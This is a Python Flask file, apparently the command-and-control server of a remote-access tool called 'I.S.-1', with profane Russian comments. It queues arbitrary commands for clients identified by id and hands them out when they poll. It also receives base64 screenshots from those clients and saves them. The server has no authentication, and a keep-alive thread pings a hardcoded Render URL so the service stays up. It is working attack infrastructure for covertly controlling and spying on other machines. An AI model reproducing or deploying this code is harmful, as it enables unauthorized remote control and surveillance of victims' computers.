# server.py - исправленная версия, ебаная
from flask import Flask, request
import base64
import os
import threading
import time
import urllib.request
from datetime import datetime

app = Flask(__name__)

pending_commands = {}
results = {}

def auto_ping():
    # Render НЕ ДАЕТ переменную RENDER_EXTERNAL_URL, поэтому хуйню пишем руками
    render_url = "https://serv-ykcq.onrender.com"  # ЗАМЕНИ НА СВОЙ URL
    print(f"[AUTOPING] Пингуем {render_url}")
    
    def ping():
        while True:
            try:
                print(f"[AUTOPING] Пинг в {time.strftime('%Y-%m-%d %H:%M:%S')}...")
                req = urllib.request.Request(
                    render_url, 
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
                )
                with urllib.request.urlopen(req, timeout=10) as response:
                    print(f"[AUTOPING] Успешно: {response.status}")
            except Exception as e:
                print(f"[AUTOPING] Ошибка: {e}")
            time.sleep(600)  # 10 минут
    
    ping_thread = threading.Thread(target=ping, daemon=True)
    ping_thread.start()
    print("[AUTOPING] Поток запущен")

@app.route('/api', methods=['GET'])
def get_command():
    client_id = request.args.get('id')
    if not client_id:
        return "no id", 400
    if client_id in pending_commands and pending_commands[client_id].get("pending"):
        cmd = pending_commands[client_id]["cmd"]
        pending_commands[client_id]["pending"] = False
        print(f"[CMD] Выдал команду {cmd} для {client_id}")
        return cmd
    return ""

@app.route('/api/upload', methods=['POST'])
def upload():
    client_id = request.form.get('id')
    data = request.form.get('data')
    if client_id and data:
        filename = f"screenshot_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        with open(filename, "wb") as f:
            f.write(base64.b64decode(data))
        print(f"[UPLOAD] Сохранил {filename}")
        return "ok"
    return "fail"

@app.route('/api/send', methods=['POST'])
def send_command():
    data = request.get_json()
    client_id = data.get('id')
    command = data.get('cmd')
    if client_id and command:
        pending_commands[client_id] = {"cmd": command, "pending": True}
        print(f"[SEND] Поставил команду {command} для {client_id}")
        return "ok"
    return "fail"

@app.route('/')
def home():
    return "I.S.-1 Control Server Running (with autoping)"

# ЗАПУСКАЕМ АВТОПИНГ В ФОНОВОМ ПОТОКЕ (нахуй gunicorn)
autoping_started = False

@app.before_first_request
def start_autoping():
    global autoping_started
    if not autoping_started:
        autoping_started = True
        auto_ping()

if __name__ == '__main__':
    auto_ping()  # для локального теста
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
